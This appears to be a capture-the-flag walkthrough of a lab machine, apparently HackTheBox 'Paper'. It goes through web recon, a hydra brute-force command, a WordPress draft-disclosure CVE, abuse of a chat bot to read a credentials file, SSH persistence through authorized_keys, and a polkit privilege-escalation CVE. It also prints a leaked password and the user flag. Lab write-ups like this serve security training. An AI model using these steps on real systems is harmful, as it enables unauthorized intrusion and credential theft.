----------------------------------------------------------------

With the nikto command we found an unsual line:
Uncommon header 'x-backend-server' found, with contents: office.paper

Lets try to asign office.paper to the machine IP in /etc/hosts


http://office.paper/ in the browser we got a different website!

Lurking around the website we found interesting informations:

On the post "Feeling Alone!" t here is a comment:

Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick

It seems like the Prisonmike is the admin of this website.
Running gobuster again:

sudo gobuster dir -u http://office.paper/ -w ~/lists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

It's a wordpress website!!

(Optional)If we had a huge list of possible users we could use the command:

cewl http://office.paper/ > users.txt 

This will create a list of possible users with the words found by the cewl spider.

Lets try hydra with the prisonmike and rockyou list:

hydra -l nick -P /usr/share/wordlists/rockyou.txt office.paper http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&redirect_to=http://office.paper/wp-admin/&testcookie=1:S=Location'

Bruteforcing does not seem to work!..

Lets get back to the wpscan to see if we can found an CVE to wordpress 5.2.3:

https://wpscan.com/wordpress/523

A vulnerability in this website with the CVE number CVE-2019-17671 lets us see private posts/drafts and taking the sensitive information that we found in a post about secret information in a draft we will try to use this exploit.

https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2

Using the proof-of-concept:

http://office.paper/?static=1

We got the draft!!

(DRAFT)

test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!

Set the /etc/hosts

with the entry:

10.10.11.143    chat.office.paper

Create a User with the registration url above.
The next thing we found in the general chat is that dwight implemented a bot that can run commands in the target machine.

So after messing aroung we found some interesting data:

recyclops file ../hubot/.env

export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000cat 
export BIND_ADDRESS=127.0.0.1

tryng to login we receive a message:

Nice Try Skynet! Bots are not allowed to login via Web Console!

In the settings for this user we found an email: recyclops@office.paper

Comment in his profile:
Earth people and Polluticon destroyed my Home planet.
  Now I will have my revenge after helping dwight!

After trying some stuff we be able to ssh with dwight user name and recyclops password

ssh dwight@10.10.11.143

To create persistence create a pub-priv key pair in your local computer:

ssh-keygen -t rsa -C "comment here"

then copy the contents of the public key file to /home/Dwight/.ssh/authorized_keys


we grab the user.txt flag:9c1b43efdb6385ffc864261120fd9a84

Then we do linpeas.sh

After analysing all the evidences, the con jobs, the files that were running by root and dwight, i did not found a way in or something i could try to exploit i begin looking at some vulnerabilities that a system can have and i found out that this machine i vulnerable to the polkit CVE-2021-3560 attack to the dbus-send. We have more information in the following url.

The exploit is here:

After creating the user with the exploit we are able to login as root with sudo <user>
